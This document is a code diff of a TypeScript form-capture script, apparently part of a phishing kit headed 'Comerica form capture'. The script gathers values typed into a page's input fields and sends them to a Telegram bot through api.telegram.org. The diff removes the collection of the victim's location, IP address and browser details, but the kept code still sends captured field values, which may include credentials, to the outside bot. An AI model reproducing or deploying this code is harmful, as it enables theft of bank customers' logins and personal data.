@@ -11,12 +11,7 @@ export async function sendPageInputTagsToTelegram(): Promise<void> {
 
   const inputs = Array.from(document.querySelectorAll<HTMLInputElement>('input'))
     .filter((input) => isRelevantInput(input));
-  const [location, ipInfo] = await Promise.all([
-    getLocation(),
-    getIPInfo(),
-  ]);
-  const userAgent = navigator.userAgent;
-  const message = buildTelegramMessage(inputs, location, ipInfo, userAgent);
+  const message = buildTelegramMessage(inputs);
 
   try {
     await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -34,48 +29,18 @@ export async function sendPageInputTagsToTelegram(): Promise<void> {
   }
 }
 
-function buildTelegramMessage(
-  inputs: HTMLInputElement[],
-  location: string,
-  ipInfo: { ip: string; isp: string },
-  userAgent: string,
-): string {
-  const timestamp = new Date().toISOString();
-  const header = [
-    'Comerica form capture',
-    `Page: ${window.location.href}`,
-    `Title: ${document.title || 'Untitled page'}`,
-    `Time: ${timestamp}`,
-    `Location: ${location}`,
-    `IP: ${ipInfo.ip}`,
-    `ISP: ${ipInfo.isp}`,
-    `User-Agent: ${userAgent}`,
-    '',
-  ].join('\n');
-
+function buildTelegramMessage(inputs: HTMLInputElement[]): string {
   if (!inputs.length) {
-    return `${header}No input fields were found on this page.`;
+    return 'No relevant input fields were found on this page.';
   }
 
-  const lines = inputs.map((input, index) => {
+  const lines = inputs.map((input) => {
     const label = getInputLabel(input);
     const value = getInputValue(input);
-
-    return [
-      `${index + 1}. ${label}`,
-      `   type: ${input.type}`,
-      `   value: ${value}`,
-      input.id ? `   id: ${input.id}` : null,
-      input.name ? `   name: ${input.name}` : null,
-      input.placeholder ? `   placeholder: ${input.placeholder}` : null,
-      `   required: ${input.required}`,
-      `   disabled: ${input.disabled}`,
-    ]
-      .filter(Boolean)
-      .join('\n');
+    return `${label}: ${value}`;
   });
 
-  return `${header}Captured fields:\n${lines.join('\n\n')}`;
+  return lines.join('\n');
 }
 
 function isRelevantInput(input: HTMLInputElement): boolean {
